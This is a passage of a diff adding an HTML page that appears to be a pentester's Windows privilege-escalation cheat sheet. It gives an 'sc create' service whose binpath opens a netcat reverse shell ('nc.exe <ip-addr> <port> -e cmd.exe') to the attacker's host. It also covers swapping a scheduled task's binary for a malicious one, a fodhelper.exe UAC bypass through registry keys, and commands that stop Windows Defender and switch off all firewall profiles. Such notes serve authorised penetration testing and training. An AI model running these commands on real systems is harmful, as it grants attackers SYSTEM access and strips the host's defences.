+<p>As it is known the maximum privilege account of windows systems is <code class="highlighter-rouge">NT AUTHORITY\SYSTEM</code> , so we need to spawn a shell with that account.</p>
+
+<p>Once our user is already on <code class="highlighter-rouge">Administrators</code> group, we can check it with different forms:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user admin
+net sessions   #only can execute local administrators
+</code></pre></div></div>
+
+<p>There are different forms to spawn a system shell, but I will explain one, creating a service.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create &lt;service_name&gt; binpath= "C:\Users\User\nc.exe &lt;ip-addr&gt; &lt;port&gt; -e cmd.exe" type= own type= interact
+</code></pre></div></div>
+
+<p>After starting our new service we will get the System shell on our handler:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc start &lt;service_name&gt;
+</code></pre></div></div>
+
+<h1 id="windows-scheduler">Windows Scheduler</h1>
+
+<p>Similar to crontab, Windows Scheduler is a component of <em>Microsoft Windows</em> that provides the ability to <em>schedule</em> the launch of programs or scripts at pre-defined times.</p>
+
+<p>If you found some of this running proceses <code class="highlighter-rouge">tasklist</code>, maybe you need to take a look:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScheduler.exe
+WService.exe
+# Some other binary that starts with WS (WindowsScheduler)
+</code></pre></div></div>
+
+<p>So we will examinate the Events System Sheduler directory: <code class="highlighter-rouge">C:\Program Files (x86)\SystemScheduler\Events</code></p>
+
+<p>Find some logs files to see which program is scheduled, and replace the binary with yout malicious one.</p>
+
+<h1 id="bypass-uac">Bypass UAC</h1>
+
+<p>User Account Control (UAC) is an access control system that forces applications and tasks to run in the context of a non-administrative account until an administrator authorizes elevated access.</p>
+
+<h2 id="mandatory-levels">Mandatory Levels</h2>
+
+<p>Exists three types of Mandatory Level:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /all
+
+GROUP INFORMATION
+-----------------
+
+Group Name                          Type             SID          Attributes                                        
+=================================== ================ ============ ==================================================
+Everyone                            Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users        Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                       Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE            Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users    Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization      Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                               Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication    Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Low Mandatory Level Unknown SID type S-1-16-4096  Mandatory group, Enabled by default, Enabled group
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Low Mandatory Level:</strong> Services like IE has no permissions, it can not write on any directory, but IE for example need to write cache on a directory. So with Low Mandatory Level we will only able to write data on the following path. <code class="highlighter-rouge">C:\Users\Victim\AppData\LocalLow</code></li>
+  <li><strong>Medium Mandatory Level:</strong> Permissions as a normal user.</li>
+  <li><strong>High Mandatory Level:</strong> Permissions as NT AUTHORITY/SYSTEM.</li>
+</ul>
+
+<p>UAC can be bypassed in various ways.</p>
+
+<h2 id="fodhelperexe">fodhelper.exe</h2>
+
+<p><code class="highlighter-rouge">fodhelper.exe</code> is a Microsoft support application responsible for managing language changes in the operating system. This binary runs as <code class="highlighter-rouge">high integrity</code> on Windows 10.</p>
+
+<p>With <code class="highlighter-rouge">sigcheck.exe</code> from <a href="https://docs.microsoft.com/en-us/sysinternals/">SysInternals </a>is posible to inspect the application manifest.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note:</strong> Search for <code class="highlighter-rouge">requestedExecutionLevel</code> as <code class="highlighter-rouge">requireAdministrator</code> and <code class="highlighter-rouge">autoElevate</code> in <code class="highlighter-rouge">true</code>.</p>
+</blockquote>
+
+<p>First we need to add some registries with REG:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+</code></pre></div></div>
+
+<h1 id="antivirus-and-firewall">Antivirus and Firewall</h1>
+
+<h2 id="antivirus">Antivirus</h2>
+
+<p>Check status:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MpComputerStatus
+</code></pre></div></div>
+
+<p>Need <code class="highlighter-rouge">NT AUTHORITY/SYSTEM</code> rights if the UAC is enabled.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net stop WinDefend
+</code></pre></div></div>
+
+<p>If it is not possible <strong>login via RDP with an Administrator user</strong> and disable it manually.</p>
+
+<h2 id="firewall">Firewall</h2>
+
+<p>Disable firewall by executing:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set allprofiles state off
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+</code></pre></div></div>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae">https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae</a></li>
+  <li><a href="https://blog.geoda-security.com/2017/06/elevate-from-admin-to-nt-authoritysystem.html">https://blog.geoda-security.com/2017/06/elevate-from-admin-to-nt-authoritysystem.html</a></li>
+  <li><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#cve-2019-1388">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#cve-2019-1388</a></li>
+  <li><a href="https://kb.digital-detective.net/display/BF/Understanding+and+Working+in+Protected+Mode+Internet+Explorer#:\~:text=A%20Low%20integrity%20process%2C%20like,files%20in%20low%20integrity%20folders.">https://kb.digital-detective.net/display/BF/Understanding+and+Working+in+Protected+Mode+Internet+Explorer#:~:text=A%20Low%20integrity%20process%2C%20like,files%20in%20low%20integrity%20folders.</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
